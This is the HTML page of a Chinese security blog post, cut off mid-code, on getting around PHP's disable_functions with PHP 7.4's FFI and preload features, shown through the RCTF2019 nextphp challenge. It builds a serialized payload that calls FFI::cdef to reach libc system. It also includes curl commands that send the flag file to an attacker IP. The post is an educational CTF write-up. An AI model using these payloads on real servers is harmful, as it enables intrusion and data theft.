<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>PHP7.4新特性绕过disable_functions | F4de&#39;s blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg">
    <meta name="description" content="西郊有密林，助君出重围。">
    <meta name="keywords" content="Web安全 | CTF">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c3dab397.css" as="style"><link rel="preload" href="/assets/js/app.23243609.js" as="script"><link rel="preload" href="/assets/js/2.b6b5fde6.js" as="script"><link rel="preload" href="/assets/js/12.f76d046e.js" as="script"><link rel="prefetch" href="/assets/js/10.61fe8e74.js"><link rel="prefetch" href="/assets/js/11.aa0a0e27.js"><link rel="prefetch" href="/assets/js/13.e7eb76d3.js"><link rel="prefetch" href="/assets/js/14.6843e7d6.js"><link rel="prefetch" href="/assets/js/15.876aebbe.js"><link rel="prefetch" href="/assets/js/16.7bda9fb3.js"><link rel="prefetch" href="/assets/js/17.4d23d90c.js"><link rel="prefetch" href="/assets/js/18.8e3bf455.js"><link rel="prefetch" href="/assets/js/19.e2910e1f.js"><link rel="prefetch" href="/assets/js/20.d3ad9048.js"><link rel="prefetch" href="/assets/js/21.44a5eb88.js"><link rel="prefetch" href="/assets/js/22.9fdb32fe.js"><link rel="prefetch" href="/assets/js/23.a4171f9f.js"><link rel="prefetch" href="/assets/js/24.1dc52702.js"><link rel="prefetch" href="/assets/js/25.0d5d1524.js"><link rel="prefetch" href="/assets/js/26.acc4bd8a.js"><link rel="prefetch" href="/assets/js/27.70c3076c.js"><link rel="prefetch" href="/assets/js/28.a6cd030a.js"><link rel="prefetch" href="/assets/js/29.74b979df.js"><link rel="prefetch" href="/assets/js/3.b2dd61fd.js"><link rel="prefetch" href="/assets/js/30.48245f1e.js"><link rel="prefetch" href="/assets/js/31.100f6dc2.js"><link rel="prefetch" href="/assets/js/32.7fc433c9.js"><link rel="prefetch" href="/assets/js/33.29387a0a.js"><link rel="prefetch" href="/assets/js/34.9de6377e.js"><link rel="prefetch" href="/assets/js/35.8d8e3101.js"><link rel="prefetch" href="/assets/js/36.cffc3ac2.js"><link rel="prefetch" href="/assets/js/37.78556217.js"><link rel="prefetch" href="/assets/js/4.1d65e77b.js"><link rel="prefetch" href="/assets/js/5.477d6d12.js"><link rel="prefetch" href="/assets/js/6.9074f6ba.js"><link rel="prefetch" href="/assets/js/7.3da58132.js"><link rel="prefetch" href="/assets/js/8.10db4dab.js"><link rel="prefetch" href="/assets/js/9.e2574eb5.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c3dab397.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="F4de's blog" class="logo"> <span class="site-name can-hide">F4de's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg"> <div class="blogger-info"><h3>F4de</h3> <span>Syclover | Web</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>php安全</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/93d259/" class="sidebar-link">初探XXE漏洞攻击</a></li><li><a href="/pages/971e5d/" class="sidebar-link">利用phar文件拓展php反序列化攻击</a></li><li><a href="/pages/715643/" aria-current="page" class="active sidebar-link">PHP新特性绕过disable_functions</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/715643/#ffi扩展" class="sidebar-link">FFI扩展</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/715643/#什么是ffi" class="sidebar-link">什么是FFI</a></li><li class="sidebar-sub-header"><a href="/pages/715643/#调用c的函数" class="sidebar-link">调用C的函数</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/715643/#preload" class="sidebar-link">PreLoad</a></li><li class="sidebar-sub-header"><a href="/pages/715643/#rctf2019-nextphp" class="sidebar-link">RCTF2019 nextphp</a></li></ul></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>python安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Java安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>其他</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <div><main class="page"> <div class="theme-vdoing-wrapper bg-style-6"><div class="articleInfo-wrap" data-v-f945b7fe><div class="articleInfo" data-v-f945b7fe><ul class="breadcrumbs" data-v-f945b7fe><li data-v-f945b7fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-f945b7fe></a></li> <li data-v-f945b7fe><span data-v-f945b7fe>技术文章</span></li> <li data-v-f945b7fe><span data-v-f945b7fe>php安全</span></li></ul> <div class="info" data-v-f945b7fe><div title="作者" class="author iconfont icon-touxiang" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>F4de</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>2020-10-11</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">
          PHP7.4新特性绕过disable_functions
        </h1> <div class="theme-vdoing-content content__default"><h2 id="ffi扩展"><a href="#ffi扩展" class="header-anchor">#</a> FFI扩展</h2> <h3 id="什么是ffi"><a href="#什么是ffi" class="header-anchor">#</a> 什么是FFI</h3> <p>FFI：Foreign Function Interface（外部函数接口）,PHP的这个扩展允许加载一些公共的库（.dll  .so），也就是可以直接调用一些C的函数。该扩展随源码发布，所以我们只要在PHP的<code>/ext/</code>目录下直接安装即可。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> php-xxx/ext/ffi/
phpize
./configure
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在安装完成要在<code>php.ini</code>文件中开启扩展，其中一项配置是<code>ffi.enable</code>，默认情况下是<code>preload</code>，修改完成后在<code>phpinfo</code>中可以查看FFI的开启情况：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011104252.png" alt="image-20201011103810212"></p> <h3 id="调用c的函数"><a href="#调用c的函数" class="header-anchor">#</a> 调用C的函数</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">// 创建一个ffi对象，加载libc并且导入system函数</span>

<span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;int system(const char *command);&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;libc.so.6&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 调用C的函数</span>

<span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;whoami&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011105520.png" alt="image-20201011105520038"></p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>使用php命令行的方式执行上述代码可以获得回显，但如果从网页端来访问<code>ffi.php</code>是无法获得回显的（<code>system</code>函数返回的是<code>int</code>类型的值）。</p></div> <p>另外关于<code>system</code>函数的声明，可以直接使用<code>man</code>命令来查看</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011105750.png" alt="image-20201011105750485"></p> <p>值得注意的是，如果使用<code>FFI::cdef</code>来声明的时候省略了<code>libc.so.6</code>也是同样可以执行命令的，支持 RTLD_DEFAULT 的平台将尝试在常规全局范围内查找在代码中声明的符号。另外，当我们可以指定<code>FFI::cdef</code>的<code>lib</code>参数的时候，可以加载我们自定义的动态链接库（需要填写绝对路径，否则就会无法加载）。</p> <h2 id="preload"><a href="#preload" class="header-anchor">#</a> PreLoad</h2> <p>参考文章：<a href="https://www.mf8.biz/php-preload/" target="_blank" rel="noopener noreferrer">PHP7.4 新特性 预缓存（Preload ）介绍 <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>简单来说，preload这个机制就是把指定的文件提前加载到内存中，之后每一个PHP文件执行的时候都会先运行该文件。</p> <div class="custom-block note"><p class="custom-block-title">笔记</p> <p>我感觉有点像其他PHP文件都<code>include</code>了指定的preload文件。</p></div> <p>使用preload机制，要在php.ini中进行相应的配置：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>[opcache]
opcache.enable=1 
opcache.preload=/{path}/preload.php  # 要预加载的文件路径
opcache.preload_user={Yourname}  # 使用preload的用户，安全考虑禁止root用户
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>配置完成后可在<code>phpinfo</code>中查看配置的情况：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011120016.png" alt="image-20201011115433586"></p> <p>更多细节可以参考<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener noreferrer">官方文档<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>，另外在值得注意的是，在文章的结尾出有这样的一句话：</p> <blockquote><p>In conjunction with ext/FFI (dangerous extension), we may allow FFI functionality only in preloaded PHP files, but not in regular ones</p></blockquote> <p>意思就是说：（如果开启了FFI功能）那么在preload文件中就可能可以使用FFI功能，这样的行为是有危险的。</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>假如现在环境中的所有要求都满足了，那么我们可以综合利用上面所说的这两点来突破一些限制。</p></div> <h2 id="rctf2019-nextphp"><a href="#rctf2019-nextphp" class="header-anchor">#</a> RCTF2019 nextphp</h2> <div class="custom-block note"><p class="custom-block-title">笔记</p> <p>知识点：使用Preload + FFI 突破disable_functions</p></div> <p>题目直接给了一个webshell，先看一下<code>phpinfo</code>：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011143933.png" alt="image-20201011143933783"></p> <p>信息搜集：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011144033.png" alt="image-20201011144033240"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011144047.png" alt="image-20201011144042170"></p> <p>可以读一下<code>/var/www/html</code>中有什么东西：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://xxxxxx/?a=print_r(scandir(%27/var/www/html%27));

// Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; index.php [3] =&gt; preload.php )
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>有个<code>preload.php</code>，读一下文件内容：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code># ?a=print_r(readfile(%27/var/www/html/preload.php%27));

# preload.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token single-quoted-string string">'ret'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token constant">null</span><span class="token punctuation">,</span>
        <span class="token single-quoted-string string">'func'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token single-quoted-string string">'print_r'</span><span class="token punctuation">,</span>
        <span class="token single-quoted-string string">'arg'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token single-quoted-string string">'1'</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> run <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">array</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__unserialize</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> serialize <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> __get <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> __set <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> __construct <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">提示</p> <p><code>__unserialize()</code>和<code>__serialize()</code>方法都是php7.4的新特性，分别对应之前版本的<code>__weakup()</code>和<code>__sleep()</code></p></div> <p>看一下<code>FFI</code>和<code>Preload</code>的配置情况：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011145112.png" alt="image-20201011145112199"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011145125.png" alt="image-20201011145125285"></p> <p>会预先加载<code>preload.php</code>，在该文件中有一个类，其中的<code>run()</code>方法会执行我们定义的任意回调函数，所以现在的思路就是：</p> <ol><li>进行序列化，生成payload</li> <li>指定<code>func</code>为<code>FFI:cdef</code>，<code>arg</code>为<code>system</code>函数的声明，利用FFI来调用底层C函数，实现绕过</li> <li>在<code>index.php</code>处反序列化，让靶机去执行我们定义的方法</li></ol> <p>生成序列化字符串：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token single-quoted-string string">'ret'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token constant">null</span><span class="token punctuation">,</span>
        <span class="token single-quoted-string string">'func'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token single-quoted-string string">'FFI::cdef'</span><span class="token punctuation">,</span>
        <span class="token single-quoted-string string">'arg'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token single-quoted-string string">'int system(const char *command);'</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>然后去执行反序列化，因为<code>system</code>函数没有回显，可以使用<code>curl</code>实现外带：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>?a=unserialize(base64_decode('QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319'))-&gt;__get('ret')-&gt;system('curl -d @/flag http://{IP}:{port}');

# curl http://{ip}:{port}/`cat /flag`
# curl -d `cat /flag` http://{ip}:{port}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011153025.png" alt="image-20201011153025919"></p> <p>另外<code>FFI:cdef</code>是支持声明PHP底层源码的函数的，所以可以直接声明为<code>int php_exec(int type, char* command);</code>，当<code>type = 3</code>的时候，执行的命令会产生回显：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token single-quoted-string string">'ret'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token constant">null</span><span class="token punctuation">,</span>
